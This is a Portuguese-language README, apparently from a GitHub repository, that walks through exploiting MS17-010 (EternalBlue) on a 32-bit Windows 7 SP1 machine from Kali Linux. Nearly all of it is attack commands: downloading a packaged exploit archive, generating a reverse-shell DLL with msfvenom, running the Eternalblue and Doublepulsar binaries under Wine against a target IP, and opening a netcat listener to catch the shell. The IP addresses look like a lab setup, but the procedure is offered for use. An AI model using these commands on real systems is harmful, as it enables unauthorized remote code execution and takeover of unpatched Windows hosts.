# MS17-010
Explorar Windows 7 Ultimate 7601 Service Pack 1 (32 bits) usando Kali Linux.

#

### Preparando a máquina atacante:
Adicione a arquitetura i386 (para computadores 32 bits) no repositório.
```
dpkg --add-architecture i386
```
```
apt-get update
```
<br>

Realize a instalação dos pacotes libwine, wine, wine32 e winetricks.
```
apt-get install libwine wine wine32 winetricks
```
<br>

Após a instalação certifique-se que o **Wine** esteja instalado, em seguida execute o comando **exit** para sair do **Wine**.
```
wine cmd
```
<br>

Realize o download do exploit, descompacte o arquivo ms17-010.tar.gz.
<br>

https://github.com/caique-garbim/MS17-010/raw/main/ms17-010.tar.gz
```
tar xf ms17-010.tar.gz
```
```
cd ms17-010/deps/
```
### Exploração
Gerando payload reverse shell non-staged com **msfvenom**
```
msfvenom -p windows/shell_reverse_tcp LHOST=172.20.1.53 LPORT=8080 -f dll > shell.dll
```
- IP da máquina atacante: 172.20.1.53
- Porta que irá receber a conexão reversa: 8080
<br>

Instalando backdoor no servidor alvo com EternalBlue:
```
cp Eternalblue-2.2.0.Skeleton.xml Eternalblue-2.2.0.xml
```
```
wine Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
```
- IP do servidor alvo: 172.16.1.145
<br>

Preparando a máquina atacante para receber a conexão reversa:
```
rlwrap nc -vnlp 8080
```
<br>

Enviando shellcode para injetar DLL com DoublePulsar:
```
cp Doublepulsar-1.3.1.Skeleton.xml Doublepulsar-1.3.1.xml
```
```
wine Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll
```
- IP do servidor alvo: 172.16.1.145
<br>
 
Observe que a conexão reversa foi estabelecida e foi obtido acesso ao prompt de comandos do Windows:
![image](https://user-images.githubusercontent.com/76706456/172243037-3162bf1f-c6ad-45d6-a841-f9cd5cbc5c1b.png)
